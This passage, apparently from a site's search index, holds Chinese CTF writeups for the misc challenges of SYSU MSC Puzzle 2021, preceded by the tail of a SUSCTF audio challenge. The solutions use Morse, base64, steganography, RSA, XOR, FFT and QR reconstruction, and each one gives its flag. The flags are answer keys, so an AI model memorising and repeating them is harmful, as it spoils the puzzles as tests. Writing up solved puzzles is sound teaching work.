440 322 420 427 503 460 295 318 245 302 407 414 410 130 369 317 \u4e09\u5341\u56db\u4e2a\u6570\u5b57\uff0c\u5bf9\u5e94\u524d\u9762\u7684\u5b57\u7b26\u4e32\u662f\u4e09\u5341\u56db\u4e2a\u5b57\u7b26\uff0c\u53ef\u80fd\u662f\u8fdb\u884c\u4e86\u67d0\u4e9b\u64cd\u4f5c \u7136\u540e\u80fd\u786e\u5b9a\u7684\u662f flag \u5f00\u5934\u7ed3\u5c3e\u662f SUSCTF{ \u548c } \u8fdb\u884c\u6f2b\u957f\u7684\u8fd0\u7b97\u548c\u731c\u6d4b\uff0c\u6700\u540e\u53d1\u73b0 AnEWmuLTiPLyis_etimes_wiLLbEcomE_B \u8fd9\u4e2a\u5b57\u7b26\u4e32\u9010\u5b57\u7b26\u4e58 flag \u540e\u503c\u7684\u53d8\u5316\u8d8b\u52bf\u548c\u524d\u9762 SilentEye \u7ed3\u679c\u7684\u8d8b\u52bf\u76f8\u540c\uff0c\u628a\u5df2\u77e5\u7684\u5199\u4e0b\u6765\uff0c\u8fdb\u884c\u7ebf\u6027\u56de\u5f52\u62df\u5408 207 , 5395 359 , 9350 220 , 5727 224 , 5829 352 , 9156 315 , 8190 359 , 9348 317 , 8250 F(x) = 26.011670619246555*x+4.942379114107098 >>> def f ( x ): ... return 26.011670619246555 * x + 4.942379114107098 ... >>> for x , y in zip ([ 207 , 359 , 220 , 224 , 352 , 315 , 359 , 374 , 290 , 310 , 277 , 507 , 391 , 513 , 423 , 392 , 508 , 383 , 440 , 322 , 420 , 427 , 503 , 460 , 295 , 318 , 245 , 302 , 407 , 414 , 410 , 130 , 369 , 317 ], [ 65 , 110 , 69 , 87 , 109 , 117 , 76 , 84 , 105 , 80 , 76 , 121 , 105 , 115 , 95 , 101 , 116 , 105 , 109 , 101 , 115 , 95 , 119 , 105 , 76 , 76 , 98 , 69 , 99 , 111 , 109 , 69 , 95 , 66 ]): ... print ( chr ( round ( f ( x ) / y )), end = \"\" ) ... SUSCTF { tHe_matter_iS_unremArkab1e } flag: SUSCTF{tHe_matter_iS_unremArkab1e}","title":"misound"},{"location":"writeups/sysu_msc_puzzle/","text":"SYSU MSC Puzzle 2021 Writeup \u00b6 MSC Puzzle \u662f\u7531\u4e2d\u5c71\u5927\u5b66 MSClub \u4e0e\u4e2d\u5c71\u5927\u5b66 W4terDr0p \u6218\u961f\u8054\u5408\u4e3e\u529e\u7684\u8da3\u5473\u6027\u89e3\u8c1c\u6e38\u620f Abstract \u57fa\u672c\u4e0a\u90fd\u662f GZTime \u51fa\u7684\u9898\uff0c\u7b97\u5230 CTF \u91cc\u5c31\u90fd\u662f misc \u7c7b\uff0c\u4e00\u5171 24 \u9053\u9898\uff0c\u4e0b\u9762\u662f\u7b80\u8981\u7684 writeup\uff1a \u4f60\u597d\uff01\u52c7\u58eb \u00b6 \u5ba3\u4f20\u6d77\u62a5\u548c\u9996\u9875\u90fd\u6709\uff0cflag\uff1a msc{He1lo_Wor1d} \u8001\u53e4\u8463 \u00b6 -.-. --- -.. . --- ..-. - .... . .---- ----. - .... -.-. . -. - ..- .-. -.-- \u6469\u5c14\u65af\u7535\u7801\uff0c\u6839\u636e\u9996\u9875\u7684\u8bf4\u660e\u5728\u5355\u8bcd\u95f4\u52a0\u4e0a\u4e0b\u5212\u7ebf\u5f97\u5230 flag\uff1a msc{CODE_OF_THE_19TH_CENTURY} \u8eb2\u5728\u5899\u540e \u00b6 \u6253\u5f00 DevTools \u770b Console\uff0cflag\uff1a msc{Wow_Y0u_f1nd_me} \u9690\u8eab\u836f\u6c34 \u00b6 \u6253\u5f00 DevTools \u770b\u4ee3\u7801\uff0c\u6709\u4e00\u4e2a display: none \u7684 flag\uff1a msc{Inv1sibility_P0tiOn} \u5b8c\u5f62\u586b\u7a7a \u00b6 We, the rustling leaves, have a voice that answers the storms, but who are you so silent? I am _ ____. \u641c\u7d22\u8fd9\u6bb5\u8bd7\u6b4c\u5f97\u5230\u7a7a\u7f3a\u5185\u5bb9\uff0c\u683c\u5f0f\u5316\u4e00\u4e0b\u5f97\u5230 flag\uff1a msc{a_mere_flower} \u53bb\u95ee\u5bfc\u822a \u00b6 \u53bb\u627e\u90a3\u4e2a\u5730\u65b9\u5427\uff01\ud83d\udc7b.\ud83d\udc7e.sysums.club \u5e76\u4e14\u53ef\u4ee5\u53d1\u73b0\u6709\u4e00\u4e2a display: none \u7684 TXT \u5b57\u6837 \u94fe\u63a5\u76f4\u63a5\u8f6c\u5230\u7684\u5730\u5740\u662f http://xn--9q8h.xn--dr8h.sysums.club/ \u6240\u4ee5\u7528 dig \u547d\u4ee4\u67e5\u8be2\u4e00\u4e0b\u8fd9\u4e2a\u57df\u540d\u7684 TXT \u8bb0\u5f55\u5c31\u53ef\u4ee5\u4e86 dig xn--9q8h.xn--dr8h.sysums.club txt flag\uff1a msc{Domain_w1th_IDNs} \u4e16\u95f4\u4e07\u7269\u7684\u7b54\u6848 \u00b6 The answer to the ultimate question of life, the universe, and everything equals to A^3 + B^3 + C^3 \u52c7\u58eb\uff0c\u8fd9\u9053\u9898\u7684\u7b54\u6848\u662f msc{A+B+C} \u4e16\u95f4\u4e07\u7269\u7684\u7b54\u6848\u5373\u6307 42\uff0c\u7136\u540e\u641c\u7d22\u5f97\u5230 \\[ -80538738812075974^3 + 80435758145817515^3+ 12602123297335631^3 = 42 \\] \u6240\u4ee5 flag\uff1a msc{12499142631077172} \u6211\u7684\u5496\u5561 \u00b6 \u6211\u4eec\u7684\u9152\u9986\u91c7\u7528\u6700\u65b0\u7684 HTCPCP/1.0 \u534f\u8bae\u4e3a\u60a8\u63d0\u4f9b\u670d\u52a1\uff01 \u201c\u563f\uff0c\u9152\u4fdd\uff01\u6211\u7684\u5496\u5561\u5462\uff1f\u201d \u201c\u5728\u505a\u4e86\uff01\u201d \u8be5\u6b7b\uff0c\u6211\u5fd8\u4e86\u8ba9\u4ed6\u5c11\u52a0\u70b9\u725b\u5976\uff0c\u6211\u5f97\u7acb\u523b\u8ba9\u4ed6\u505c\u4e0b\uff01 \u641c\u7d22 HTCPCP/1.0 \uff08\u8d85\u6587\u672c\u5496\u5561\u58f6\uff09\u534f\u8bae\uff0c\u505c\u6b62\u52a0\u5165\u725b\u5976\u7684\u8bf7\u6c42\u662f WHEN\uff0c\u6240\u4ee5 flag\uff1a msc{WHEN} \u8bbe\u8ba1\u5e08 \u00b6 \u300c\u6211\u60f3\u8981\u8fd9\u4e2a\u5b57\u5c0f\u4e00\u70b9\u7684\u540c\u65f6\u5927\u4e00\u70b9\u300d ww91igfYzsb0AguGyMvZDcbKzxnPz25LCIekBxnJE1qWxZrUB3rOzxjFqMfZzty0Fq== \u5927\u5199\u8f6c\u5c0f\u5199\uff0c\u5c0f\u5199\u8f6c\u5927\u5199\uff0c\u7136\u540e base64 \u89e3\u7801\uff0c\u5f97\u5230 flag\uff1a msc{T0_4nother_Base64} \u76d1\u542c\u7535\u8bdd \u00b6 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/phone.mp3 \u662f\u4e00\u4e32\u7535\u8bdd\u7684\u62e8\u53f7\u97f3\uff0c\u653e\u5230 Au \u91cc\u9762\u770b\u9891\u8c31\uff0c\u628a\u5bf9\u5e94\u6309\u952e\u6284\u4e0b\u6765\u5c31\u884c\u4e86\uff0c\u5177\u4f53\u662f\u4ec0\u4e48\u8bb0\u4e0d\u5f97\u4e86 \u4e00\u5f20\u56fe\u7247 \u00b6 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc.png stegsolve \u6253\u5f00\uff0c\u5728 red 0 \u53ef\u4ee5\u6e05\u6670\u770b\u5230 flag\uff1a msc{Text_Hidd3n_Und6r_The_1mage} \u6570\u5b57\u5e8f\u5217 \u00b6 ..., 22, 30, 42, 56, ? , 101, 135, 176, 231, 297, ... ..., 72, 81, 90, 100, 110, ?, 132, 144, 156, 169, ... ..., 43, 47, 55, 67, 79, ?, 123, 155, 171, 175, ... ..., 891, 9805, 25, 527, 23, ?, 17, 37, 131, 43, ... ..., 58, 51, 89, 28, 97, ?, 30, 103, 107, 62, ... ..., 20, 26, 36, 50, 60, ?, 135, 138, 248, 315, ... ..., 2, 1, 9, 35, 77, ?, 91, 49, 15, 2, ... ..., 49, 62, 70, 77, 91, ?, 103, 107, 115, 122, ... ..., 8, 26, 60, ?, 196, 308, 456, 645, 880, 1166, ... \u76f4\u63a5\u5206\u522b\u7c98\u8d34\u5230 OEIS \u4e2d\uff0c\u5f97\u5230\u9700\u8981\u586b\u7684\u6570\u5b57\uff1a 77 121 95 83 101 114 105 101 115 \u770b\u6570\u5b57\u8303\u56f4\u633a\u89c4\u6574\uff0cASCII \u8f6c\u6362\u4e00\u4e0b\u5f97\u5230 flag\uff1a msc{My_Series} \u672a\u77e5\u4fe1\u53f7 \u00b6 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/signal.mp3 \u6211\u89c9\u5f97\uff0c\u8fd9\u91cc\u9762\u6709\u8e4a\u8df7\uff01\u4f60\u77e5\u9053\u4e8c\u5341\u4e16\u7eaa\u4e94\u516d\u5341\u5e74\u4ee3\u7684\u7535\u89c6\u662f\u4f7f\u7528\u6444\u50cf\u7ba1\u548c\u7535\u5b50\u76d1\u89c6\u5668\u5236\u6210\u7684\u5417\uff1f \u6240\u4ee5\u5e94\u8be5\u662f SSTV\uff08\u6162\u626b\u63cf\u7535\u89c6\uff09\u4f20\u8f93\u56fe\u7247\uff0c\u7528\u624b\u673a\u8f6f\u4ef6 Robot36 \u5c31\u53ef\u4ee5\u8f6c\u6362\uff0c\u5f97\u5230\uff1a \u626b\u63cf\u5f97\u5230 flag\uff1a msc{SSTV_transfer_image} \u53c8\u4e00\u5f20\u56fe\u7247 \u00b6 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc2.png \u8fd8\u662f\u6254\u5230 stegsolve \u91cc\uff0c\u5728 red0 green0 blue0 \u5206\u522b\u80fd\u770b\u5230\u6587\u5b57\uff0c\u5408\u8d77\u6765\u662f \u5bc6\u7801\u662f p455w0rd binwalk \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a png \u91cc\u504f\u79fb 0xC23A \u540e\u9762\u85cf\u4e86\u4e00\u4e2a zip\uff0c\u63d0\u53d6\u51fa\u6765\u7528\u5bc6\u7801\u89e3\u538b\u5f97\u5230\u4e00\u4e2a svg \u6587\u4ef6 \u6d4f\u89c8\u5668\u6253\u5f00\u4e4b\u540e\u53d1\u73b0\u6709\u4e00\u4e2a\u767d\u8272\u77e9\u5f62\uff0c\u5220\u6389\u5b83\u5c31\u80fd\u770b\u5230 flag\uff1a msc{svg_The_vectors} \u76f2\u4eba\u6570\u5b66\u5bb6 \u00b6 \u2838\u2829\u282e\u2830\u2824\u2806\u2818\u2806\u2810\u2837\u282d\u2818\u2812\u2810\u2809\u2815\u280e\u2839\u282d\u280c\u2806\u283c\u282c\u2839\u2802\u280c\u2806\u283c\u283e\u281c\u2832\u2824\u282d\u2818\u2806\u2810\u283b\u2819\u282d\u2838\u2831 Tip: \u5c06\u7ed3\u679c\u56db\u820d\u4e94\u5165\u4fdd\u7559 7 \u4f4d\u5c0f\u6570\uff0c\u5e76\u7528_\u66ff\u6362\u5c0f\u6570\u70b9\u540e\u63d0\u4ea4 \u5bf9\u7167\u6559\u7a0b https://nemeth.aphtech.org/ \u5b66\u4e60\uff0c\u8f6c\u6362\u516c\u5f0f\uff1a \\[ \\int_{-2}^2(x^3\\cos\\frac{x}{2}+\\frac{1}{2})\\sqrt{4-x^2}\\mathrm dx = \\pi \\approx 3.1415927 \\] \u6240\u4ee5 flag\uff1a msc{3_1415927} \u6700\u5c0f\u7684\u8bed\u8a00 \u00b6 \u52c7\u58eb\uff0c\u636e\u8bf4\u8fd9\u4e2a\u4e16\u754c\u5728\u5f88\u4e45\u8fdc\u7684\u65f6\u5019\u6709\u4e00\u4f4d\u51ef\u6492\u5927\u5e1d\uff0c\u5728\u4ed6\u79bb\u4e16\u7684\u65f6\u5019\uff0c\u4e3a\u8fd9\u4e2a\u4e16\u754c\u521b\u9020\u4e86\u4e00\u79cd\u6700\u5c0f\u7684\u8bed\u8a00\uff0c\u6211\u4eec\u90fd\u4e0d\u6562\u8bfb\u51fa\u5b83\u7684\u540d\u79f0\u2026\ubrainfuck \u8f93\u51fa\u5f97\u5230\uff1a =WYxy^WXArn(qs|p!-k<~<X4i;A[!n97zu4Yru{@=={qkw+78tx~[94:*By66&@U<5.&;66&:047V@D[,r:60}55^{yX<3@u~.sv/m4(]i)1pV!op[(Z:54f/ssgt(!XZ|xq|ouuv+@|!=u \u6839\u636e\u9898\u9762\u7684\u51ef\u6492\uff0c\u53ef\u4ee5\u63a8\u6d4b\u662f ASCII \u504f\u79fb\uff0c\u7136\u540e\u628a\u8f93\u51fa\u9650\u5236\u5728 [33, 126] \u4e2d\uff08ASCII\u53ef\u89c1\u5b57\u7b26\uff09\uff0c\u7b2c 54 \u6b21\u504f\u79fb\u7684\u7ed3\u679c\uff1a v24ST923zMIaLNWKZfFuYu3mDtz6ZIrpUPm4MPVyvvVLFRdpqOSY6rmsc{Too_y0ung_too_simp1y}6eMsoiXnn9VT3ulyPYgNQhHma8DbjK1ZJK6a5snmAhNNBOaZ35WSLWJPPQdyWZvP \u4e2d\u95f4\u5c31\u662f flag\uff1a msc{Too_y0ung_too_simp1y} \u4e00\u4e2a\u4f20\u8bf4 \u00b6 \u201c\u52c7\u58eb\uff0c\u6211\u542c\u8fc7\u4e00\u4e2a\u53e4\u8001\u7684\u4f20\u8bf4\u2026\u2026\u201d \u201c\u8bf7\u8bb2\uff01\u201d \u300c1024\u00d7768 \u5927\u5c0f\u7684\u56fe\u7247\uff0c\u53ef\u4ee5\u8f7b\u677e\u85cf\u4e0b 786432 \u4e2a\u5730\u5740\u3002\u300d https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/justcolor.png \u4e00\u4e2a\u7eaf\u8272\u6587\u4ef6\uff0c\u6839\u636e\u9898\u9762\u53ef\u4ee5\u63a8\u6d4b\u662f\u8bfb\u53d6 rgba \u503c\u4f5c\u4e3a ip \u5730\u5740 \u6240\u4ee5\u5199\u4e2a\u811a\u672c\u8bfb\u4e00\u4e0b from PIL import Image ; print ( Image . open ( \"justcolor.png\" ) . getpixel (( 0 , 0 ))) \uff0c\u5f97\u5230 ip \u5730\u5740\uff1a116.63.166.50 \u8bbf\u95ee\u5f97\u5230 flag\uff1a msc{Hide_IP_in_RGBA} \u65f6\u95f4\u5546\u4eba \u00b6 \u4f60\u53d1\u73b0\u4e86\u4e00\u5757\u5e03\u6ee1\u82d4\u85d3\u7684\u77f3\u677f\uff0c\u4e0a\u9762\u523b\u7740\u4e0b\u9762\u7684\u51e0\u4e2a\u5b57\uff1a \u2003\u22a7\u00e3\u22b7\u00ac\u00a7\u00d7\u00e3\u02c6\ud835\udd0e \u4f60\u770b\u4e0d\u61c2\uff0c\u4f46\u5927\u53d7\u9707\u64bc\u3002 \u8def\u8fb9\u6709\u4e2a\u795e\u79d8\u7684\u9ed1\u8863\u5546\u4eba\uff0c\u4ed6\u81ea\u79f0\u80fd\u4e3a\u4f60\u63d0\u4f9b\u5e2e\u52a9\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u82db\u523b\u7684\u6761\u4ef6\uff1a\u4f60\u5fc5\u987b\u5728\u6bcf\u5929\u51cc\u6668\u56db\u70b9\u7684\u7b2c\u4e00\u4e2a\u516b\u5206\u949f\u5185\u8fc7\u6765\u627e\u4ed6\uff0c\u4ed6\u624d\u80fd\u7ed9\u4f60\u63d0\u4f9b\u7ebf\u7d22\u3002 \u8c03\u6574\u65f6\u95f4\u5230\u51cc\u6668\u56db\u70b9\u7684\u7b2c\u4e00\u4e2a\u516b\u5206\u949f\u5185\uff0c\u5f97\u5230 hint\uff1a \u5546\u4eba\u770b\u7740\u4f60\uff0c\u4ec0\u4e48\u8bdd\u4e5f\u6ca1\u8bf4\uff0c\u7ed9\u4f60\u9012\u4e86\u4e00\u5f20\u7eb8\u6761\uff0c\u4e0a\u9762\u5199\u7740\uff1acharref\u3002 \u641c\u7d22\u5f97\u5230\u5b57\u7b26\u5bf9\u7167\u8868\uff1a https://dev.w3.org/html5/html-author/charref \u7136\u540e\u4f9d\u6b21\u641c\u7d22\u8fd9\u4e9b\u5b57\u7b26\uff0c\u9996\u5b57\u6bcd\u62fc\u8d77\u6765\u5c31\u662f flag\uff1a msc{mainstacK} \u8ffd\u8e2a\u76ee\u6807 \u00b6 \u4e00\u5f20\u901a\u7f09\u4ee4\u8d34\u5728\u6751\u53e3\u7684\u516c\u544a\u724c\u4e0a\uff0c\u636e\u8bf4\u6355\u83b7\u5230\u4e86\u76d7\u8d3c\u4e0b\u4e00\u6b21\u8981\u4f5c\u6848\u7684\u5730\u65b9\uff0c\u4f46\u6ca1\u4eba\u770b\u5f97\u61c2\u3002 7PMM399R+FQ2 \u201c\u54e6\uff0c\u4f60\u53ea\u9700\u8981\u7528**********\u5c31\u80fd\u5f97\u5230\u7b54\u6848\u201d \u201c\u54e6\uff01\u6536\u5230\uff01\u201d \u201c\u4f60\u77e5\u9053 The simplest way to talk about location \u5417\uff1f\u201d \u201c\u77e5\u9053\u2026\u2026\u539f\u6765\u4f60\u5c31\u662f\u60f3\u8981\u90a3\u4e09\u4e2a\u5355\u8bcd\u554a\u201d \u76f4\u63a5\u4f7f\u7528 \u4e09\u8bcd\u5730\u5740 \u8c03\u6210\u82f1\u6587\u641c\u7d22 7PMM399R+FQ2 \u5f97\u5230\u4f4d\u7f6e\u7684\u4e09\u4e2a\u5355\u8bcd ///flux.tank.pitch \u6240\u4ee5 flag\uff1a msc{flux_tank_pitch} \u7d27\u6025\u5524\u9192 \u00b6 \u95ee\u9898 from Crypto.Util.number import * p = 0xbb1a21ab46e16672a6dfe537c5d03121252685a1a72fab827ed14d61caa80f68b9bda9fb0d9651719ab099d05fd0da03443a50106533f1034a81e280cd3e85fd q = 0x85eed89c104292b715a45ec8a1c3328506b429c2b7477c9ab094313fcf0020ba7352b102608cab79bde92978aedb052a546fb289c453feac87ee791ba1019579 n = p * q e = 0x10001 answer = b 'something you dont know' m = bytes_to_long ( answer ) c = pow ( m , e , n ) # c = 0x17c7af1ec9c020eb9d8f26049f002b58f93591a817ebff4c00e9e46254261db54a2c2d086dd0f532994329faf2133b1c7002913b187f898d87c8093b2290440e927 78956c60b92f27e3dc4d15b4c79f97b79bca253b0b4542375c37f8e37e1f8e38d728634133376eacd2c448aa523b2eda0b4c5f2af47250147f4193d58596c \u57fa\u7840\u7684 RSA\uff0c\u8ba1\u7b97\u51fa d \u7136\u540e\u89e3\u5bc6\u5c31\u53ef\u4ee5\u5f97\u5230 flag\uff1a d = pow ( e , - 1 , ( p - 1 ) * ( q - 1 )) print ( long_to_bytes ( pow ( c , d , n ))) # b'msc{W0w_You_know_H0w_to_d3crypt_the_RSA}' Emojis \u00b6 \u201c\u8fd9\u662f\u4e00\u4e32 EMOJI \uff0c\u91cc\u9762\u4f1a\u85cf\u7740\u4ec0\u4e48\u6837\u7684\u4fe1\u606f\u5462\uff1f\u201d \ud83d\ude43\ud83d\udcb5\ud83c\udf3f\ud83c\udfa4\ud83d\udeaa\ud83c\udf0f\ud83d\udc0e\ud83e\udd4b\ud83d\udeab\ud83d\ude06\u2705\ud83d\ude0a\ud83d\udc49\ud83d\udc63\ud83d\udcc2\u23e9\ud83d\ude06\ud83c\udf3f\ud83c\udf2a\ud83d\ude0e\ud83c\udf75\u2603\ud83d\udcc2\ud83d\udeb9\ud83d\udc4c\ud83c\udff9\ud83d\udc0e\ud83c\udf3f\ud83d\ude00\ud83d\udc63\ud83c\udfce\ud83d\ude0d\ud83d\ude06\ud83c\udf74\u2705\ud83d\udc41\u2705\u2705\ud83d\ude06\ud83d\udd79\ud83d\udd2c\ud83d\udc0d\ud83c\udf85\u2716\ud83c\udf2a\ud83d\udc63\ud83d\udeb9\ud83d\udca7\ud83c\udf74\ud83d\udcb5\ud83c\udf4d\ud83c\udf2a\u2709\ud83d\udc41\ud83d\udeaa\ud83d\udd2a\u23e9\ud83d\udca7\ud83c\udf83\ud83e\udd4b\ud83d\udd79\ud83c\udf4e\ud83d\ude0a\u2139 \u54e6\u5bf9\u4e86\uff0c\u6211\u8981\u7684\u662f\u5ffd\u7565\u8bef\u5dee\u540e\u7684\u6570\u5b57\u54e6~ DevTools \u91cc\u53ef\u4ee5\u770b\u5230 display: none \u7684 aes\uff1f\u6240\u4ee5\u5e94\u8be5\u662f\u4f7f\u7528 emoji-aes \u6839\u636e\u9898\u9762\u4e2d\u7684\u5168\u5927\u5199\u3001\u4ee3\u7801\u5757\u5305\u88f9\u7684 EMOJI \uff0c\u53ef\u4ee5\u63a8\u6d4b\u51fa key \u5c31\u662f EMOJI\uff0c\u89e3\u5bc6\u5f97\u5230\uff1a ORANGE RED YELLOW GREEN GOLD \u6839\u636e\u989c\u8272\u4ee5\u53ca\u9898\u9762\u4e2d\u7684\u201c\u5ffd\u7565\u8bef\u5dee\u201d\u731c\u6d4b\u662f\u4e94\u8272\u73af\u7535\u963b\uff0c\u8f6c\u6362\u5f97\u5230\u5ffd\u7565\u8bef\u5dee\u540e\u662f 32400000 \u6b27\u59c6\uff0c\u6240\u4ee5 flag\uff1a msc{32400000} \u7b80\u6613\u52a0\u5bc6 \u00b6 \u636e\u8bf4\u8fd9\u662f\u4e00\u79cd\u6781\u5176\u666e\u904d\u7684\u52a0\u5bc6\u65b9\u6cd5\u2026\u2026 \u800c\u4e14\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u89e3\u5bc6\u2026\u2026 \u6216\u8bb8\u2026\u2026\u4f60\u53ef\u4ee5\u542c\u5230\u6765\u81ea\u7b54\u6848\u7684\u58f0\u97f3\u2026\u2026 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc.enc \u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u89e3\u5bc6\u7684\u7b80\u6613\u52a0\u5bc6\uff0c\u53ef\u4ee5\u731c\u6d4b\u662f\u5f02\u6216\uff0c\u7136\u540e\u6253\u5f00\u770b\u5341\u516d\u8fdb\u5236\u53d1\u73b0\u5f88\u591a 0x66 \uff0c\u6240\u4ee5\u8003\u8651\u5168\u90e8\u5f02\u6216 0x66 \uff1a import struct res = [] with open ( \"msc.enc\" , \"rb\" ) as f : while True : c = f . read ( 1 ) if not c : break res . append ( ord ( c ) ^ 0x66 ) with open ( \"res.bin\" , \"wb\" ) as f : for each in res : f . write ( struct . pack ( \"B\" , each )) \u5f97\u5230\u7684 res.bin \u4e2d\u53ef\u4ee5\u5f88\u5bb9\u6613\u53d1\u73b0 FL Keys \u548c\u4e00\u4e9b\u952e\u540d\uff0c\u7528 fl \u6216\u8005\u5e93\u4e50\u961f\u7b49\u8f6f\u4ef6\u6253\u5f00\u5c31\u53ef\u4ee5\u770b\u5230 flag\uff1a msc{The_xor_midi_GIFT} \u56fe\u50cf\u5904\u7406\u5927\u5e08 \u00b6 \u4f60\u5c31\u662f\u56fe\u50cf\u5904\u7406\u5927\u5e08\uff01 \u6240\u4ee5\u5e2e\u6211\u627e\u5230\u85cf\u5728\u56fe\u7247\u91cc\u7684\u79d8\u5bc6\u5427\uff01\u54e6\u5bf9\u4e86\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e00\u5f20\u5c0f\u7eb8\u6761\uff0c\u5e94\u8be5\u80fd\u5e2e\u5230\u4f60\uff08 0.8560967955058971 17.682512473330895 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/cv.zip \u9898\u76ee\u4ee3\u7801 import cv2 import numpy as np def mapping ( data , down = 0 , up = 255 , tp = np . uint8 ): data_max = data . max () data_min = data . min () interval = data_max - data_min new_interval = up - down new_data = ( data - data_min ) * new_interval / interval + down new_data = new_data . astype ( tp ) return new_data def fft ( img ): fft = np . fft . fft2 ( img ) fft = np . fft . fftshift ( fft ) m = np . log ( np . abs ( fft )) p = np . angle ( fft ) return m , p if __name__ == '__main__' : img = cv2 . imread ( f 'answer.png' , cv2 . IMREAD_GRAYSCALE ) m , p = fft ( img ) print ( m . min (), m . max ()) new_img1 = mapping ( m ) new_img2 = mapping ( p ) cv2 . imwrite ( f 'cv1.png' , new_img1 ) cv2 . imwrite ( f 'cv2.png' , new_img2 ) \u4e00\u4e2a FFT\uff0c\u76f4\u63a5\u628a\u4ee3\u7801\u9006\u56de\u53bb\u5c31\u597d\u4e86\uff1a import cv2 import numpy as np def mapping ( data , down = 0 , up = 255 , tp = np . uint8 ): data_max = data . max () data_min = data . min () interval = data_max - data_min new_interval = up - down new_data = ( data - data_min ) * new_interval / interval + down new_data = new_data . astype ( tp ) return new_data if __name__ == '__main__' : img1 = cv2 . imread ( \"cv1.png\" , cv2 . IMREAD_GRAYSCALE ) img2 = cv2 . imread ( \"cv2.png\" , cv2 . IMREAD_GRAYSCALE ) m = mapping ( img1 , 0.8560967955058971 , 17.682512473330895 ) p = mapping ( img2 , 0 , 2 * np . pi ) res = m * ( np . cos ( p ) + np . sin ( p ) * 1 j ) ishift = np . fft . ifftshift ( res ) iimg = np . fft . ifft2 ( ishift ) iimg = np . abs ( iimg ) iimg = mapping ( iimg ) cv2 . imwrite ( f 'answer.png' , iimg ) flag: msc{The_master_of_cv} \u6df7\u4e71\u7684\u4e8c\u7ef4\u7801 \u00b6 \u4f60\u597d\uff01\u52c7\u58eb\uff0c\u4f60\u8d70\u5230\u8fd9\u91cc\u5df2\u7ecf\u8bc1\u660e\u4e86\u4f60\u7684\u5b9e\u529b\uff01 \u6211\u672c\u8be5\u7ed9\u4f60\u7684\u662f\u4e00\u5f20\u8bb0\u5f55\u7740\u7b54\u6848\u7684\u4e8c\u7ef4\u7801\uff0c\u4f46\u7531\u4e8e\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u6211\u4eec\u5fd8\u8bb0\u6807\u6ce8\u6bcf\u4e00\u884c\u7684\u987a\u5e8f\u4e86\uff0c\u5bfc\u81f4\u6211\u4eec\u6536\u5230\u4e86\u8fd9\u6837\u7684\u6570\u636e\u2026\u2026\u52c7\u58eb\uff0c\u4f60\u80fd\u8fd8\u539f\u51fa\u5b83\u7684\u539f\u59cb\u6a21\u6837\u5417\uff1f \u9898\u76ee [ \"10111010111000011000001011101\" , \"00111010110010101000000000010\" , \"11100001101100100001011010110\" , \"10000010000111101111111111101\" , \"10111010000010001000001011101\" , \"01110011010111001001011100001\" , \"10101101110101001110000110010\" , \"10111010111010111110001011101\" , \"10010100110101101111100111110\" , \"10111110011101011000011010111\" , \"11001010001011011000000001000\" , \"10111010100101100111111110100\" , \"10000010110010110100100011001\" , \"11111110101010101010101111111\" , \"10111010001100010100110110111\" , \"11111110101101010101110110000\" , \"00000000100100100101100011100\" , \"00000000111001101011011111001\" , \"11111100100110010010001011110\" , \"00010001110001001101110001010\" , \"10000010111110001101101000001\" , \"11001110110110010101100100001\" , \"11011110111101111101111110100\" , \"11111110100010100101101011100\" , \"00000000011111011001100000000\" , \"10111010111001000110010100010\" , \"11111110101110011001001111111\" , \"10000010001100011010101000001\" , \"10011111111101000101110010111\" ] \u628a\u8fd9\u4e9b\u503c\u8f93\u5165\u5230 csv \u4e2d\uff0c\u7136\u540e Excel \u6253\u5f00\uff0c\u8c03\u4e00\u8c03\u683c\u5f0f\uff0c\u5f00\u59cb\u6309\u7167\u4e8c\u7ef4\u7801\u7684\u89c4\u5219\uff08\u4e09\u4e2a\u5b9a\u4f4d\u70b9\uff0c\u5bf9\u9f50\u56fe\u6837\u3001\u65f6\u5e8f\u56fe\u6837\u7b49\uff09\u6765\u786e\u5b9a\u53ef\u4ee5\u786e\u5b9a\u7684\u884c\uff0c\u7ed3\u679c\uff1a \u4e0a\u9762\u6709 2 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff0c\u4e2d\u95f4\u6709 11 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff08\u5176\u4e2d\u7531\u4e8e\u65f6\u5e8f\u56fe\u6837\u7684\u539f\u56e0\uff0c\u6240\u4ee5\u76f8\u5f53\u4e8e\u6709 5 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\u548c 6 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff09\uff0c\u6240\u4ee5\u603b\u5171\u6709 2*5!*6! = 172800 \u79cd\u53ef\u80fd\uff0c\u6240\u4ee5\u53ef\u4ee5\u679a\u4e3e\u4e86\u3002\u53ef\u4ee5\u4f7f\u7528 pyzbar \u8fd9\u4e2a\u5305\u6765\u81ea\u52a8\u89e3\u4e8c\u7ef4\u7801 \u6539\u4e00\u6539 GZTime 2021 \u7965\u4e91\u676f\u7684 writeup \u91cc\u7684\u4ee3\u7801\uff1a \u4ee3\u7801 data = [ \"11111110101110011001001111111\" , \"10000010111110001101101000001\" , \"10111010111010111110001011101\" , # <- \u8fd9\u4e24\u884c\u9700\u8981\u624b\u52a8\u8c03\u6362\u5404\u8dd1\u4e00\u6b21 \"10111010000010001000001011101\" , \"10111010111000011000001011101\" , # <- \u8fd9\u4e24\u884c\u9700\u8981\u624b\u52a8\u8c03\u6362\u5404\u8dd1\u4e00\u6b21 \"10000010001100011010101000001\" , \"11111110101010101010101111111\" , \"00000000011111011001100000000\" , \"10011111111101000101110010111\" , \"11100001101100100001011010110\" , \"00111010110010101000000000010\" , \"10101101110101001110000110010\" , \"01110011010111001001011100001\" , \"10010100110101101111100111110\" , \"10111110011101011000011010111\" , \"00000000111001101011011111001\" , \"11001010001011011000000001000\" , \"11111100100110010010001011110\" , \"11001110110110010101100100001\" 